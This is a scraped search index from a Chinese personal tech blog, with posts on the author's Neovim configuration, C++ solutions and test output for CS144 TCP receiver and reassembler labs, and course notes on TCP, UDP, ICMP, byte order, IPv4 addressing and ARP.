vim.lsp.handlers[\"textDocument/publishDiagnostics\"] = vim.lsp.with( vim.lsp.diagnostic.on_publish_diagnostics, { update_in_insert = true, } ) 当开了多个窗口的时候，q 只能退出当前的窗口，可以使用 qa，这样可以直接退出全部窗口。 我后来尝试调试窗口怎么样的时候，发现开多个窗口，窗口之间的线不明显，看起来很不得劲。 可以输入 : highlight WinSeparator guibg=none 解决，这是把那块的背景设为空，我不是这么解决的，我是把 guifg 设成一个亮色。 如果是在配置文件中持久化这个设置，则是: vim.api.nvim_set_hl(0, \"WinSeparator\", { fg = \"#F8EDEC\" }) ","date":"2024-07-31","objectID":"/posts/neovim_setup/:3:0","tags":["neovim","intro"],"title":"我的 neovim 配置","uri":"/posts/neovim_setup/"},{"categories":null,"content":"具体配置 $ tree . ├── init.lua ├── lazy-lock.json └── lua ├── config │ ├── colorscheme.lua │ ├── keymap.lua │ ├── lazy.lua │ └── option.lua ├── lsp │ └── clangd.lua └── plugins ├── cmp.lua ├── config │ ├── cmp.lua │ ├── comment.lua │ ├── lsp.lua │ ├── none-ls.lua │ ├── telescope.lua │ ├── treesitter.lua │ ├── ui_bar_dark.lua │ ├── ui_bar_light.lua │ ├── ui_bar.lua │ └── ui_fs_tree.lua ├── debug.lua ├── lsp.lua ├── ui.lua └── util.lua 6 directories, 22 files 这是我的目录架构，lua/lsp 这个目录实际上还没用上，我把 clangd.lua 的内容挪到 lua/plugins/config/lsp.lua 下了。 init.lua 的内容很简单: require('config.option') require('config.keymap') require('config.lazy') require('config.colorscheme') init.lua 的作用就是加载各种配置文件，本身没有什么设置。这里的 . 代表一个目录层级，init.lua 貌似直接去 lua 文件夹内找了，所以直接写 config。 lua/config/option.lua 的内容是: -- Hint: use `:h \u003coption\u003e` to figure out the meaning if needed vim.opt.clipboard = 'unnamedplus' -- use system clipboard -- vim.opt.completeopt = { 'menu', 'menuone', 'noselect' } vim.opt.mouse = 'a' -- allow the mouse to be used in Nvim vim.opt.tabstop = 2 -- number of visual spaces per TAB vim.opt.softtabstop = 2 -- number of spacesin tab when editing vim.opt.shiftwidth = 2 -- insert 2 spaces on a tab vim.opt.expandtab = true -- tabs are spaces, mainly because of python vim.api.nvim_set_keymap('v', '\u003cTab\u003e', '\u003egv', { noremap = true, silent = true }) vim.api.nvim_set_keymap('v', '\u003cS-Tab\u003e', '\u003cgv', { noremap = true, silent = true }) vim.opt.number = true -- show absolute number vim.opt.cursorline = true -- highlight cursor line underneath the cursor horizontally vim.opt.splitbelow = true -- open new vertical split bottom vim.opt.splitright = true -- open new horizontal splits right vim.opt.showmode = true -- we are experienced, wo don't need the \"-- INSERT --\" mode hint vim.opt.laststatus = 3 vim.opt.incsearch = true -- search as characters are entered vim.opt.hlsearch = false -- do not highlight matches vim.opt.ignorecase = true -- ignore case in searches by default vim.opt.smartcase = true -- but make it case sensitive if an uppercase is entered vim.opt.termguicolors = true vim.o.cmdheight = 0 vim.api.nvim_create_autocmd(\"BufWritePost\", { callback = function() vim.notify(\"File saved!\", \"info\", { title = \"Notification\" }) end, }) 这里面大多抄别人的配置文件，所以有注释，我自己写的懒得写注释了（ 内容基本上是设置剪切板为系统剪切板，设置缩进为 2，开启行号等等。后几行是针对通知插件设置的，将最下栏的高度设置为 0，使其不显示，并把保存设为一个通知。 lua/config/keymap.lua 设置了一些快捷键，由于太长，我就不粘贴了。 lua/config/lazy.lua 设置了 LazyVim 插件，我直接抄的 LazyVim 官网提供的配置方案。 lua/config/colorscheme.lua 设置了 neovim 的颜色主题。 local colorscheme_dark = 'catppuccin-mocha' local colorscheme_light = 'catppuccin-latte' local is_ok, _ = pcall(vim.cmd, \"colorscheme \" .. colorscheme_dark) if not is_ok then vim.notify('colorscheme ' .. colorscheme_light .. ' not found!') return end vim.api.nvim_set_hl(0, \"WinSeparator\", { fg = \"#F8EDEC\" }) 我特地暗色和亮色的都拿了，方便我改终端背景颜色的时候改 neovim 的，我甚至为此还搞了两套底下这个 bar 的配置，不过亮色的那个配置很糊弄就是了。 ","date":"2024-07-31","objectID":"/posts/neovim_setup/:4:0","tags":["neovim","intro"],"title":"我的 neovim 配置","uri":"/posts/neovim_setup/"},{"categories":["刷课_Lab"],"content":"CS144 课程 Lab Assignment 中的 Checkpoint 2: the TCP receive","date":"2024-07-29","objectID":"/posts/cs144_lab2/","tags":["CS144_lab"],"title":"CS144-2024-lab_2: the TCP receiver","uri":"/posts/cs144_lab2/"},{"categories":["刷课_Lab"],"content":"CS144 课程 Lab Assignment 中的 Checkpoint 2: the TCP receive CS144-2024-lab_2: the TCP receiver ","date":"2024-07-29","objectID":"/posts/cs144_lab2/:0:0","tags":["CS144_lab"],"title":"CS144-2024-lab_2: the TCP receiver","uri":"/posts/cs144_lab2/"},{"categories":["刷课_Lab"],"content":"Translating between 64-bit indexes and 32-bit seqnos As a warmup, we’ll need to implement TCP’s way of representing indexes. Last week you created a Reassembler that reassembles substrings where each individual byte has a 64-bit stream index, with the first byte in the stream always having index zero. A 64-bit index is big enough that we can treat it as never overflowing. In the TCP headers, however, space is precious, and each byte’s index in the stream is represented not with a 64-bit index but with a 32-bit “sequence number,” or “seqno\" 作为热身，我们需要实现 TCP 表示索引的方式。上周，您创建了一个 Reassembler，它可以重组子字符串，其中每个字节都有一个 64 位流索引，流中的第一个字节始终具有索引零。64 位索引足够大，我们可以将其视为永不溢出。然而，在 TCP 标头中，空间是宝贵的，流中每个字节的索引不是用 64 位索引表示的，而是用 32 位“序列号”或“seqno”表示的 Wrap32 Wrap32::wrap( uint64_t n, Wrap32 zero_point ) { return Wrap32 { static_cast\u003cuint32_t\u003e(zero_point.raw_value_ + n) }; } uint64_t Wrap32::unwrap( Wrap32 zero_point, uint64_t checkpoint ) const { auto diff = this-\u003eraw_value_ - zero_point.raw_value_; if (checkpoint \u003e= diff) { auto rsm = checkpoint - diff + (1UL \u003c\u003c 31); return diff + (rsm / (1UL \u003c\u003c 32)) * (1UL \u003c\u003c 32); } return diff; } 从 absolute seqno 转成 seqno 还是很简单的，一行就能处理。但是 seqno 转成 absolute seqno 需要做一些处理，因为 seqno 是 32 bit，所以 seqno 的值可能对应到 absolute seqno，可能大了几个 UINT32_MAX。 ","date":"2024-07-29","objectID":"/posts/cs144_lab2/:1:0","tags":["CS144_lab"],"title":"CS144-2024-lab_2: the TCP receiver","uri":"/posts/cs144_lab2/"},{"categories":["刷课_Lab"],"content":"Implementing the TCP receiver ongratulations on getting the wrapping and unwrapping logic right! We’ll shake your hand (or, post-covid, elbow-bump) if this victory happens at the lab session. In the rest of this lab, you’ll be implementing the TCPReceiver. It will (1) receive messages from its peer’s sender and reassemble the ByteStream using a Reassembler, and (2) send messages back to the peer’s sender that contain the acknowledgment number (ackno) and window size. We’re expecting this to take about 15 lines of code in total.\u003e 恭喜您正确掌握了 wrap 和 unwrap 逻辑！如果在实验环节中取得这一胜利，我们将与您握手（或者，在疫情后，碰肘）。在本实验的其余部分，您将实现 TCPReceiver。它将 (1) 从其对等方的发送方接收消息并使用重组器重组字节流，以及 (2) 将包含确认号 (ackno) 和 window size 的消息发送回对等方的发送方。我们预计这总共需要大约 15 行代码。 我在 TCPReceiver 类中添加了几个成员变量: TCPReceiverMessage curr_tcm_ { std::nullopt, static_cast\u003cuint16_t\u003e( writer().total_capacity() \u003e UINT16_MAX ? UINT16_MAX : writer().total_capacity() ), false }; Wrap32 zero_sno_ { 0 }; uint64_t curr_sno_ { 0 }; 我懒得修改代码提供的构造函数了，就直接在这里构造好得了，第二个写这么长是为了防止溢出。 之后 TCPReceiver::receive() 和 TCPReceiver::send() 的实现就是这样: void TCPReceiver::receive( TCPSenderMessage message ) { if ( message.RST ) { reader().set_error(); } if ( message.SYN ) { curr_tcm_.ackno = message.seqno; zero_sno_ = message.seqno; } if ( curr_tcm_.ackno.has_value() ) { const auto buf_bytes_prev = writer().bytes_pushed(); curr_sno_ = message.seqno.unwrap( zero_sno_, curr_sno_ ); if ( !message.SYN \u0026\u0026 curr_sno_ == 0 \u0026\u0026 !message.payload.empty() ) { message.payload.clear(); } if ( curr_sno_ != 0 ) { curr_sno_ -= 1; } reassembler_.insert( curr_sno_, message.payload, message.FIN ); const auto buf_bytes_next = writer().bytes_pushed(); curr_tcm_.ackno.value() = curr_tcm_.ackno.value() + static_cast\u003cuint32_t\u003e( message.SYN ) + ( buf_bytes_next - buf_bytes_prev ); if ( writer().is_closed() ) { curr_tcm_.ackno.value() = curr_tcm_.ackno.value() + 1; } } } TCPReceiverMessage TCPReceiver::send() const { return { curr_tcm_.ackno, static_cast\u003cuint16_t\u003e( writer().available_capacity() \u003e UINT16_MAX ? UINT16_MAX : writer().available_capacity() ), reader().has_error() || writer().has_error() }; } 我看别人博客上提供的代码没有内部对非 SYN 且 sqno 为 0 且内容不为空做判定的，我这个显得还是太小家子气了，不过有个测试是这个，我这是为了过那个测试用的（ 我说的是下面这个 if 判断: if ( !message.SYN \u0026\u0026 curr_sno_ == 0 \u0026\u0026 !message.payload.empty() ) { message.payload.clear(); }","date":"2024-07-29","objectID":"/posts/cs144_lab2/:2:0","tags":["CS144_lab"],"title":"CS144-2024-lab_2: the TCP receiver","uri":"/posts/cs144_lab2/"},{"categories":["刷课笔记"],"content":"CS114 课程的课程笔记","date":"2024-07-26","objectID":"/posts/cs144_notes_003/","tags":["CS144_notes"],"title":"TCP \u0026 UDP \u0026 ICMP","uri":"/posts/cs144_notes_003/"},{"categories":["刷课笔记"],"content":"CS114 课程的课程笔记 ","date":"2024-07-26","objectID":"/posts/cs144_notes_003/:0:0","tags":["CS144_notes"],"title":"TCP \u0026 UDP \u0026 ICMP","uri":"/posts/cs144_notes_003/"},{"categories":["刷课笔记"],"content":"TCP 服务 TCP (Transmission Control Protocol4) 提供了 可靠的，端到端的，双向的字节流服务。TCP 是传输层的协议。 将两个主机之间的 TCP 通信称为连接 (connection)。在连接的两端，TCP 会保留一个状态机去跟踪连接在做什么。 A 主机和 B 主机需要三次握手后建立 TCP 连接。 A 向 B 发送一条信息表示 A 处的 TCP 层 希望和 B 建立连接，该消息称为 SYN 消息。因为 A 还会发送其将用来识别字节流中的字节的基数，如果发送 0 ，表示将会从 0 开始。 B 会回复一个 SYN-ACK，B 发出 SYN 信号，因为 B 确认 A 的请求并同意建立连接。B 的 TCP 层还会发送一个 SYN 给 A，以表示它希望建立连接，并且发送一个数字以表明字节流起始编号。 A 回复一个 ACK，表示它正在接收通信请求。 当 A 和 B 完成相互之间的数据发送之后，它们需要关闭连接，并在之后都开始清理与状态机关联的状态。 A 上的 TCP 层可以通过发送 FIN 信息以关闭连接。 B 确认 A 不再有要发送的数据，并停止从 A 中获取数据。 但 B 可能仍有新数据要发送，并且还没有准备管理连接，所以回复的 ACK 还可以将新数据从 B 发送到 A。B 可以一致向 A 发送新数据。 等 B 把数据都发送完了，就发送自己的 FIN 给 A。 A 再发送一个 ACK 进行确认，以确认连接现已关闭。 现在就是正式关闭，状态也可以安全移除。 通过以下四个方式保证了可靠地发送: 当 TCP 层接收到数据时，它将确认 ACK 给发送方使其知道数据已送达。 checksum 检测损坏的数据，TCP header 带有一个 checksum，覆盖了报头和内部的数据，以检测在途中是否存坏。 序列号检测丢失的数据，每个段的 header 都包含字节序列中的序列号。例如双方都同一序列号从 1000 开始，则第一个段的序号就是 1000，如果这个段有 500 字节数据，那下一个段的序列号应该是 1500。 如果段丢失，就能通过序列号发现，这时候就需要发送方重发数据。 流量控制以防止接收器超速运行。 防止 A 发包速度比 B 处理快多了，B 处理不过来的情况。 在 TCP 中，接收方不断询问发送方是否可以继续发送，也就是告诉发送方其缓冲区并还有多少空间可以接收新数据。 TCP 按照正确的顺序将数据传送到应用程序。 TCP 会尝试平衡所有 TCP 连接之间的网络容量，也就是 Congestion Control。 Flag ACK, 确认序列号有效 SYN, 正在发送同步信号，这是三次握手的一部分 FIN, 表示连接一个方向的关闭 PSH, 告诉另一端 TCP 立即传送数据，而不是等待更多的数据 对于携带与时间相关的数据（比如按键）来说有用 ","date":"2024-07-26","objectID":"/posts/cs144_notes_003/:1:0","tags":["CS144_notes"],"title":"TCP \u0026 UDP \u0026 ICMP","uri":"/posts/cs144_notes_003/"},{"categories":["刷课笔记"],"content":"UDP 服务 UDP (User Datagram Protocol)并不保证可靠的到达，只提供简单的送达功能。 使用 IPV4 时，UDP 数据包中 checksum 字段是可选的，可以全为 0 表示不包含该字段。checksum 还会包含 IP 数据包中的一些信息，如源地址，目的地址，协议 ID 等。这违反了分层原理，这是为了允许 UDP 检测传递到错误地址的数据包。 UDP 不需要先建立连接，可以直接发包，所以更适合那些简单的请求-应答的服务，比如 DNS, DHCP, NTP 等。 ","date":"2024-07-26","objectID":"/posts/cs144_notes_003/:2:0","tags":["CS144_notes"],"title":"TCP \u0026 UDP \u0026 ICMP","uri":"/posts/cs144_notes_003/"},{"categories":["刷课笔记"],"content":"ICMP 服务 ICMP (Internet Control Message Protocol) 用于报错以及诊断问题。 在主机间传达有关网络层的信息 报告错误，并帮助诊断错误 ICMP位于 IP 之上，是一种传输层协议，并不可靠，它没有重发，也不会保留消息的状态。 假设 A 向 B 发包，但是路由器找不到 B，就会发送一个 ICMP 包给 A 表示找不到。 路由器会将 IP 数据报中的header 放到自己的 header 中。之后加上类型和 code 以标记错误。最后将这些放到新的 IP 数据报中。 ping ping 直接调用 ICMP，它发送 ICMP 回显请求。ping 了对方后，对方也会发送一个 ICMP 回来。 tarceroute traceroute 的目标是在 A 到 B 的路径中找到路由器，并测量从 A 到每个路由器的数据包的往返时间 这是通过 UDP 实现的。 A 发送 UDP 信息，并且这个 IP 数据报的 TTL 是 1，第一个路由器收到后递减 TTL 直接到 0，就会丢包，然后发回一个 ICMP 信息以通知 TTL 过期。这时就可以知道第一个路由器的信息，并且还可以测量时间。 之后再发送一个 TTL 为 2 的数据报，以此类推。 并且这个 UDP 包会请求对方的一个不太可能使用的端口，以让对方也是发送一个 ICMP 回来表示该端口无法访问。 ","date":"2024-07-26","objectID":"/posts/cs144_notes_003/:3:0","tags":["CS144_notes"],"title":"TCP \u0026 UDP \u0026 ICMP","uri":"/posts/cs144_notes_003/"},{"categories":["刷课笔记"],"content":"端到端原则 1984 年， Saltzer, Reed, and Clark paper 的一篇文章指出：端到端原则指的是网络虽然可以完成更多的事情，但只是帮助，不能完全依靠网络，尽可能由终端主机实现功能。 在 IETF 的 RFC 1958 中有更简短的描述：网络的工作就是尽可能高效灵活地传输数据包，除此之外的工作都应该在主机上实现。 ","date":"2024-07-26","objectID":"/posts/cs144_notes_003/:4:0","tags":["CS144_notes"],"title":"TCP \u0026 UDP \u0026 ICMP","uri":"/posts/cs144_notes_003/"},{"categories":["刷课笔记"],"content":"CS114 课程的课程笔记","date":"2024-07-25","objectID":"/posts/cs144_notes_002/","tags":["CS144_notes"],"title":"字节序 \u0026 IPV4 地址 \u0026 ARP 协议","uri":"/posts/cs144_notes_002/"},{"categories":["刷课笔记"],"content":"CS114 课程的课程笔记 字节序 \u0026 IPV4 地址 \u0026 ARP 协议 ","date":"2024-07-25","objectID":"/posts/cs144_notes_002/:0:0","tags":["CS144_notes"],"title":"字节序 \u0026 IPV4 地址 \u0026 ARP 协议","uri":"/posts/cs144_notes_002/"},{"categories":["刷课笔记"],"content":"字节排版和格式 假设要发送 1024 ，十六进制是 0x0400 来表示。 在小端法表示中，最低有效字节位于最低地址，也就是 0x00, 0x04 这么存储。 在大端法表示中，最高有效字节位于最低地址，也就是 0x04, 0x00 这么存储。 但通信双方处理器使用的的字节序未必一致。例如 Intel 和 AMD x86 处理器使用小端法，不过一些处理器支持双端法，然后由操作系统决定到底用小端还是大端。 协议规范规定了使用大端，互联网所有协议都使用大端字节序。 如果自身机器是小端字节序的话，可以写个测试: 假设 TCP 端口为 80，存一个变量 http_port = 80 uint16_t http_port = 80; if (packet-\u003eport == http_port) { ... } // ERROR 此时就可以比对，http_port 是小端存储，但 packet-\u003eport 则是大端，虽然实际上要存储的值都是 80，但测试失败。 为了简化这个过程，C 提供了一些库函数: htons(), ntohs(), htonl(), ntohl() htons: host to network short ntohl: network to host long #include \u003carpa/inet.h\u003e uint http_port = 80; uint16_t packet_port = ntohs(packet-\u003eport) if (packet_port == http_port) { ... } // OK 对于小端字节序表示来说，ntohs() 和 htons() 会调换字节的顺序，对于大端字节序来说，二者什么也不做，只是将参数返回。 ","date":"2024-07-25","objectID":"/posts/cs144_notes_002/:1:0","tags":["CS144_notes"],"title":"字节序 \u0026 IPV4 地址 \u0026 ARP 协议","uri":"/posts/cs144_notes_002/"},{"categories":["刷课笔记"],"content":"IPV4 地址 IPV4 地址长度为 32 位。通常分成4组写，例如: 192.168.1.1 除了 IP 地址的标示，还有网络掩码 (netmask)。例如网络掩码 255.255.255.0，表示 IP 地址 和自己的前三个八位字节匹配的在同一网络中。而 255.255.252.0 则表示前 22 位相同的和自己在同一网络中。 这就可以对两个 IP 地址和它们自己的掩码按位与来判断是否在同一网络中 if ((A \u0026 netmask) == (B \u0026 netmask)) { ... } 可以使用 ip addr 查看自己的 IP 地址，有些发行版默认不装 net-tools 也就无法使用 ipconfig，但应该会带 iproute2。 ","date":"2024-07-25","objectID":"/posts/cs144_notes_002/:2:0","tags":["CS144_notes"],"title":"字节序 \u0026 IPV4 地址 \u0026 ARP 协议","uri":"/posts/cs144_notes_002/"},{"categories":["刷课笔记"],"content":"地址结构 传统分为三种 0 network(1 -\u003e 7) host(8 -\u003e 31) 1 0 network(2 -\u003e 15) host(16 -\u003e 31) 1 1 0 network(3 -\u003e 23) host(24 -\u003e 31) 其中，network 部分表示为 administrative domain，比如 MIT，Stanford，host 部分具体指是该网络的哪个设备。 但这种方式无法应对早就膨胀的互联网主机数量。 现在 IPV4 已经结构化，称为 CIDR (Classless Inter-Domain Routing)。CIDR 可以自定义前缀长度，其大小为 2 的幂次。当说到 CIDR 地址时，也就是在说就是网络掩码的长度，例如 192.168.1.0/24，表示长度为 24 的网络掩码，表示其容纳了 256 个地址，/16 是长度为16的网络掩码，描述了 65536 个地址。 IANA (Internet Assigned Numbers Authority)组织负责分配 IP 地址，其背后是 ICANN (Internet Corporation for Assigned Names and Numbers)，ICANN 将工作委托给了 IANA。IANA 向区域互联网注册机构 (Regional Internet Registries, RIRs)分发了 /8 (1600 万个地址)，每个州有自己的 RIR，目前总共有五个 RIR。 美洲互联网号码注册管理机构（American Registry for Internet Numbers，ARIN）管理北美、南极洲和部分加勒比地区事务 欧洲IP网络资源协调中心（RIPE Network Coordination Centre，RIPE NCC）管理欧洲、中东和中亚地区事务 亚太网络信息中心（Asia-Pacific Network Information Centre，APNIC）管理亚洲和太平洋地区事务 拉丁美洲及加勒比地区互联网地址注册管理机构（Latin American and Caribbean Internet Address Registry，LACNIC）管理拉丁美洲和部分加勒比地区事务 非洲网络信息中心（African Network Information Centre，AfriNIC）管理非洲事务 ","date":"2024-07-25","objectID":"/posts/cs144_notes_002/:2:1","tags":["CS144_notes"],"title":"字节序 \u0026 IPV4 地址 \u0026 ARP 协议","uri":"/posts/cs144_notes_002/"},{"categories":["刷课笔记"],"content":"Longest Prefix Match 路由器通过转发表决定转发数据包的链路，当数据包到达时，路由器会在转发表找到和该地址最匹配的条目，并以此决定转发链路。 最长前缀匹配 (Longest Prefix Match, LPM)是 IP 路由用来决定转发地址的算法。 ","date":"2024-07-25","objectID":"/posts/cs144_notes_002/:3:0","tags":["CS144_notes"],"title":"字节序 \u0026 IPV4 地址 \u0026 ARP 协议","uri":"/posts/cs144_notes_002/"},{"categories":["刷课笔记"],"content":"ARP, Address Resolution Protocol ARP 协议是网络层使用，用于发现与其直连的网络地址的 link 地址。设备自己有 IP 地址，但是它需要将数据报发送到哪个 link 上，ARP 协议解决了这个问题。每一层服务都有每一层用于标识的地址，IP 是网络层的地址，而 link 地址标示了特定的网卡，例如，Ethernet 地址是 48 bit。 48 bit 的 Ethernet 地址以冒号分隔的 6 个组形式写入，例如: 0:18:e7:f3:ce:1a。 假设下面这个场景: 中间的网关有两个网卡，分别连 A 和 B 两个主机。网关本身就是位于 A 所属的这部分网络中，但网关在只有一个 IP 地址的情况下无法正常工作。所以网卡或路由器具有多个接口，也就具有多个 IP 地址。 假设 A 要向 B 发送数据包。首先判断目的地是否和自己处于同一网络内，网络掩码会表明这一点。 所以 A 需要通过网关来发包，该数据报网络层目标是 171.43.22.5，但链路层的目标为网关的地址 0:18:e7:f3:ce:1a。当网关收到数据报后，网关会为它的下一跳确定为节点 B，然后将其放到 B 的链路层帧中。 这里存在一个问题，A 知道需要通过 192.168.0.1 的网关发送数据包，所以它需要有和 192.168.0.1 关联的 link 地址，但如何获取这个地址。 这里通过一种方式将网络层地址映射到其对应的链路层地址。这里使用的就是 ARP 协议执行此操作。 ARP 是一种简单的 “request-reply” 的协议。 每个节点都保留在网络中 IP 地址到链路层地址映射的缓存，如果节点需要将数据报发送到它没有映射的 IP 地址，就需要发送一个请求，内容类似 “谁的 IP 地址是 XXX”，对应 IP 地址的节点再给出回应“我是这个地址”，这个回应就带着链路层地址。收到这个回复后，节点就可以建立映射缓存并发包。一个节点发出请求，网络中的每个节点都会收到该数据包。 ARP 请求时包含请求者的 IP 地址和链路层地址，以便于收到的一方可以插入或更新自己的映射缓存。这种映射缓存保存的时间取决于其操作系统。 Hardware: 此请求或响应应用于哪个链路层 Protocol: 此请求或响应针对的网络协议 opcode: 该数据报是请求还是响应 length 指长度，比如 Ethernet 48 bit 长度就是 6，而 IPV4 地址长度则是 4。 这些字段都会以大端字节序来存储。 最开始 ARP 规范认为回应者应该单播发给请求者，但现在广播更加普遍。 ","date":"2024-07-25","objectID":"/posts/cs144_notes_002/:4:0","tags":["CS144_notes"],"title":"字节序 \u0026 IPV4 地址 \u0026 ARP 协议","uri":"/posts/cs144_notes_002/"},{"categories":["刷课_Lab"],"content":"CS144 课程 Lab Assignment 中的  Checkpoint 1: stitching substrings into a byte stream","date":"2024-07-24","objectID":"/posts/cs144_lab1/","tags":["CS144_lab"],"title":"CS144-2024-lab_1: stitching substrings into a byte stream","uri":"/posts/cs144_lab1/"},{"categories":["刷课_Lab"],"content":"CS144 课程 Lab Assignment 中的 Checkpoint 1: stitching substrings into a byte stream CS144-2024-lab_1: stitching substrings into a byte stream As part of the lab assignment, you will implement a TCP receiver: the module that receives datagrams and turns them into a reliable byte stream to be read from the socket by the application—just as your webget program read the byte stream from the webserver in Checkpoint 0 作为实验任务的一部分，你将实现一个 TCP 接收器：接收数据报并将其转化为可靠字节流的模块，以便应用程序从 socket 中读取–就像你的 webget 程序在 Checkpoint 0 中从网络服务器读取字节流一样。 在 Reassembler 类中添加下面这些字段: std::deque\u003cchar\u003e buffer_ {}; std::deque\u003cbool\u003e buf_enable_ {false}; uint64_t used_index_ {0}; uint64_t wcount_ {0}; bool fetch_last_ {false}; uint64_t max_length_ {0}; 对于 insert() 和 bytes_pending() 的实现: void Reassembler::insert( uint64_t first_index, string data, bool is_last_substring ) { const auto limit = std::min( data.size(), used_index_ + output_.writer().available_capacity() - first_index ); if (buffer_.size() \u003c first_index + limit) { buffer_.resize(first_index + limit); buf_enable_.resize(first_index + limit); } for ( uint64_t i = 0; i \u003c limit; ++i ) { if (buf_enable_.at(first_index + i)) { continue; } buffer_[first_index + i] = data.at(i); buf_enable_[first_index + i] = true; wcount_ += 1; } if ( is_last_substring ) { fetch_last_ = true; max_length_ = first_index + data.size(); } for (; used_index_ \u003c buf_enable_.size() \u0026\u0026 buf_enable_.at(used_index_); ++used_index_) { output_.writer().push( std::string { buffer_.at( used_index_ ) } ); --wcount_; } if ( fetch_last_ \u0026\u0026 used_index_ == max_length_ ) { buffer_.clear(); buf_enable_.clear(); output_.writer().close(); } } uint64_t Reassembler::bytes_pending() const { return wcount_; } 不过这样得不到太高的速度，我等下次尝试优化一下吧（逃 我就是 C++ 菜狗，优化也优化不了什么，换了个数据结构，一开始用 std::unordered_map\u003cuint64_t, char\u003e，查找很方便，但是插入擦除貌似就不是很行了，我选择用了 std::deque\u003cchar\u003e 和 std::deque\u003cbool\u003e 来代替，需要一个 bool 类型的 std::deque\u003c\u003e 是因为我为了让插入字符的位置就是该字符实际的索引位置，直接 resize 放大 buffer 的大小，我想通过 std::deque\u003cbool\u003e buf_enable_ 标示一下哪个位是真实有效的，哪个是还没有值的。 $ cmake --build build -j`nproc` --target check1 Test project /home/zuos/codPjt/Cpp/minnow/build Connected to MAKE jobserver Start 1: compile with bug-checkers 1/17 Test #1: compile with bug-checkers ........ Passed 0.17 sec Start 3: byte_stream_basics 2/17 Test #3: byte_stream_basics ............... Passed 0.01 sec Start 4: byte_stream_capacity 3/17 Test #4: byte_stream_capacity ............. Passed 0.01 sec Start 5: byte_stream_one_write 4/17 Test #5: byte_stream_one_write ............ Passed 0.01 sec Start 6: byte_stream_two_writes 5/17 Test #6: byte_stream_two_writes ........... Passed 0.01 sec Start 7: byte_stream_many_writes 6/17 Test #7: byte_stream_many_writes .......... Passed 0.04 sec Start 8: byte_stream_stress_test 7/17 Test #8: byte_stream_stress_test .......... Passed 0.25 sec Start 9: reassembler_single 8/17 Test #9: reassembler_single ............... Passed 0.01 sec Start 10: reassembler_cap 9/17 Test #10: reassembler_cap .................. Passed 0.01 sec Start 11: reassembler_seq 10/17 Test #11: reassembler_seq .................. Passed 0.01 sec Start 12: reassembler_dup 11/17 Test #12: reassembler_dup .................. Passed 0.02 sec Start 13: reassembler_holes 12/17 Test #13: reassembler_holes ................ Passed 0.01 sec Start 14: reassembler_overlapping 13/17 Test #14: reassembler_overlapping .......... Passed 0.01 sec Start 15: reassembler_win 14/17 Test #15: reassembler_win .................. Passed 5.40 sec Start 37: compile with optimization 15/17 Test #37: compile with optimization ........ Passed 0.11 sec Start 38: byte_stream_speed_test ByteStream throughput: 0.59 Gbit/s 16/17 Test #38: byte_stream_speed_test ........... Passed 0.19 sec Start 39: reassembler_speed_test Reassembler throughput: 0.30 Gbit/s 17/17 Test #39: reassembler_speed_test ........... Passed 0.50 sec 100% tests passed, 0 tests failed out of 17 Total Test time (real) = 6.78 sec Built target check1 后来我换成 clang++ 编译，速度还有所提升 $ cmake --build build -j`nproc` --target c","date":"2024-07-24","objectID":"/posts/cs144_lab1/:0:0","tags":["CS144_lab"],"title":"CS144-2024-lab_1: stitching substrings into a byte stream","uri":"/posts/cs144_lab1/"},{"categories":["刷课笔记"],"content":"CS114 课程的课程笔记","date":"2024-07-22","objectID":"/posts/cs144_notes_001/","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"CS114 课程的课程笔记 网络应用协议 \u0026 网络分层模型 \u0026 设计原则 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:0:0","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"网络应用所使用的协议简介 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:1:0","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"World Wide Web (HTTP) 万维网使用 HTTP (Hypertext Transfer Protocol) 通信。 在 HTTP 中，客户端打开到服务器的连接并发送命令 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:1:1","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"BitTorrent BitTorrent 是一种允许人们共享大文件的程序。 不同于 Web，BitTorrent 中是客户端像其他客户端申请。BitTorrent 将文件分为称为 pieces 的数据块，一个客户端从另一个客户端下载了一个块后，它会告诉其他客户端自己拥有这个块，这种协作的客户端的集合被称为群集(swarms)。 当用户想要下载某个文件时，他需要先下载 torrent 文件（这通常是通过互联网找到的），这个 torrent 文件描述了要下载的文件的相关信息，还有这个 torrent 的 tracker 信息（tracker 是一个保持 track 群集的成员的节点）。 加入一个 torrent，自己这个客户端会连接到 tracker，并请求其他客户端的列表，本机就会尝试连接到其他客户端并开始下载文件 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:1:2","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"Skype 简单情况下就是客户端A和客户端B都能互相访问，那么也没什么可做的。 如果引入了 NAT (Network Address Translator，就像无线路由器就是NAT) 就会复杂一些。自己的设备会在 NAT 的后面，这就导致自己的设备可以通过 NAT 连接互联网，但互联网上的设备不能直接访问到自己的设备。 假设 B 在 NAT 后方，那么 A 就无法直接连接 B。 Skype 通过使用一种被称为 Rendezvous 服务器的东西解决了这个问题。 一开始 A 和 B 都会和 Rendezvous 服务器建立连接，当 A 想要连接 B 的时候，这个请求会通过 Rendezvous 服务器发送到B这里，如果B同意就由 B 尝试连接到 A。这里被称为反向连接。 如果 A 和 B 都在 NAT 后面，Skype 通过使用 Relay 服务器处理这个情况。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:1:3","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"网络分层模型 整个互联网本身就由主机，链接和路由组成，数据以数据包的形式在每个链接中跳转传递。数据包包含数据和一段头部信息，这个信息包含数据包的来路和去向。 ","date":"2024-07-22","objectID":"/posts/cs144_notes_001/:2:0","tags":["CS144_notes"],"title":"网络应用协议 \u0026 网络分层模型 \u0026 设计原则","uri":"/posts/cs144_notes_001/"},{"categories":["刷课笔记"],"content":"链路层 